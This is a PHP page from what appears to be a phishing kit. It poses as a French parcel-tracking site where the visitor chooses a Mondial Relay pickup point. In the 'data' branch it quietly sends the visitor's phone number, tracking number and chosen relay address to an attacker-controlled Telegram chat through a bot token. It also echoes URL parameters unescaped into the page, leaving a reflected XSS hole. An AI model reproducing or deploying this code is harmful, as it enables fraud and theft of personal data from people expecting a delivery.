<?php

if (isset($_GET["iframe"])) {
?>
    <!DOCTYPE html>
    <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr" dir="ltr">

    <head>
        <script src="//ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
        <script src="//unpkg.com/leaflet/dist/leaflet.js"></script>
        <link rel="stylesheet" type="text/css" href="//unpkg.com/leaflet/dist/leaflet.css">
        <script src="//widget.mondialrelay.com/parcelshop-picker/jquery.plugin.mondialrelay.parcelshoppicker.min.js"></script>
        <style>
            html,
            body,
            body>div {
                height: 100%;
                width: 100%;
                padding: 0;
                margin: 0;
            }
        </style>
        <link rel="stylesheet" type="text/css" href="https://unpkg.com/leaflet/dist/leaflet.css">
        <script type="text/javascript" src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
        <link rel="stylesheet" type="text/css" href="https://widget.mondialrelay.com/parcelshop-picker/v4_0/css/themes/mondialrelay/style.min.css?v=4.0.11">
        <link rel="stylesheet" type="text/css" href="https://widget.mondialrelay.com/parcelshop-picker/v4_0/css/themes/mondialrelay/responsive.min.css?v=4.0.11">
    </head>

    <body>


        <div id="Zone_Widget"></div>
        <script>
            $(document).ready(function() {
                $("#Zone_Widget").MR_ParcelShopPicker({

                    Brand: "BDTEST  ",
                    Country: "FR",
                    PostCode: "<?= $_GET["iframe"] ?>",
                    ColLivMod: "24R",
                    // Nombre de Point Relais à afficher
                    NbResults: "7",

                    Responsive: true,
                    ShowResultsOnMap: true,
                    OnParcelShopSelected: function(data) {
                        $('#Zone_Widget').html(``);
                        console.log(data);
                        window.parent.location.href = "./points?data=" + JSON.stringify(data)
                    }

                });

                function remov() {
                    $("#Zone_Widget div").filter(function() {
                        return $(this).attr("style")?.includes("color: red");
                    }).remove();
                }
                setInterval(() => {
                    $("#Zone_Widget div").filter(function() {
                        return $(this).attr("style")?.includes("color: red");
                    }).remove();
                }, 500)
            });
        </script>


    </body>

    </html>
<?php
    die();
} else if (isset($_GET['data'])) {
    $_SESSION["point"] = $_GET["data"];

    $data = json_decode($_SESSION["point"]);


    telegram_api($rez["token"], "sendMessage", [
        "chat_id" => $rez["cliques"],
        "text" =>  "🌐 Suivi : <b>" . $rez["suivi"] . "</b>\n📞 Téléphone : " .  $_SESSION["phone"] . "\n🏡 Point relais : <b>" . $data->Nom . "</b>\n (<code>" . $data->Adresse1 . " " . $data->Ville . " " . $data->CP . " </code>)" . $info,
        "parse_mode" => "HTML",
    ]);

    header("location: ./info?points");

    die();
}


$header = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/header.php');
$footer = require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/footer.php');
$html = (function () {
    global $rez;
    ob_start();
    $postal = isset($_GET["postal"]);

?>


    <form method="get">
        <div class="breadcrumb">
            <div class="grid">
                <div class="row">
                    <ul>
                        <li><a href="#/">
                                Accueil</a></li>
                        <li class="active">Suivi de colis</li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="internal-page suivi">
            <div class="grid">
                <div class="row">
                    <div class="col-xs-12 col-sm-12 col-md-12 mt-5 center">
                    </div>
                </div>
            </div>
            <div class="main">

                <div data-v-67007474="" id="tracking-wrapper" class="app-wrapper">
                    <div data-v-577ebd12="" data-v-67007474="">
                        <div class="suivi-colis-page">
                            <div data-v-577ebd12="" class="input-zone">
                                <h2 data-v-577ebd12="">Colis numéro: <?= $rez["suivi"] ?></h2>




                                <h3>
                                    Choisissez point relais


                                </h3>

                                <p>
                                    Votre colis sera livré au point relais sélectionné, entre 8h00 et 18h00, sauf les dimanches et jours fériés.<br /><br />
                                    En cas d'échec de la livraison, il sera automatiquement redirigé vers le point relais le plus proche de votre domicile.
                                </p>
                                <br>
                                <h4 style="text-align: center">Recherche de point relais</h4>
                                <?php if (!$postal) { ?>
                                    <div class="form-row" style="width: 100%;">
                                        <label for="tracking_form_phone" class="required">Code postal</label>
                                        <input type="tel" maxlength="5" minlength="5" id="tracking_form_phone" name="postal" required="required" placeholder="Entrez votre code postal">
                                    </div>
                                    <div>
                                        <button type="submit" id="tracking_form_submit" class="btn btn-primary btn-suivi">Rechercher</button>
                                    </div>
                                <?php } else { ?>
                                    <iframe src="./points?iframe=<?= $_GET["postal"] ?>" style="border: 0px;width:100%;height:500px"></iframe>
                                <?php } ?>


                            </div>

                        </div>
                        <div id="loader-div-new" class="hidden-class-new">
                            <div id="mask-id-new"></div>
                            <div class="spinner-class-new"></div>
                        </div>
                        <script>
                            document.querySelector("form").addEventListener("submit", function(e) {
                                document.getElementById("loader-div-new").style.visibility = "visible";
                                document.getElementById("mask-id-new").style = "opacity: 1; bottom: -500px;"
                            })
                        </script>
                    </div>

                </div>
            </div>
        </div>
    </form>


<?php
    return ob_get_clean();
})();

$html = $header . $html . $footer;
require_once($_SERVER["DOCUMENT_ROOT"] . '/views/components/base.php');
?>